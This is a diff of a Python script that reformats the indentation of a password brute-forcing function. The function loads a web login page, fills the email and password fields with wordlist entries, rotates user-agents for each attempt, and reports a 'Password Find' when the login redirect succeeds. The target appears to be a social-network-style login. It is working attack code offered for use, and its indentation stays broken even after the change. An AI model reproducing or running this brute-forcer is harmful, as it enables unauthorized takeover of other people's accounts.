@@ -28,18 +28,18 @@ def main():
 	print("Password does not exist in the wordlist") 	
 
  def brute(password):	
-             sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
-             sys.stdout.flush()
-              br.addheaders = [('User-agent', random.choice(useragents))]	
-             site = br.open(login)
-  br.select_form(nr = 0)
-  br.form['email'] = email	
-  br.form['pass'] = password	
-  sub = br.submit()	log = sub.geturl()
-  if log != login and (not 'login_attempt' in log):	
-  print("\n\n[+] Password Find = {}".format(password))	
-  raw_input("ANY KEY to Exit....")	
-  sys.exit(1)
+	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))	
+	sys.stdout.flush()	
+	br.addheaders = [('User-agent', random.choice(useragents))]	
+	site = br.open(login)	
+	br.select_form(nr = 0)	
+	br.form['email'] = email	
+	br.form['pass'] = password	
+	sub = br.submit()	
+	log = sub.geturl()	
+	if log != login and (not 'login_attempt' in log):			
+		print("\n\n[+] Password Find = {}".format(password))			
+		raw_input("ANY KEY to Exit....")			sys.exit(1)
 
 def search():	
       global password
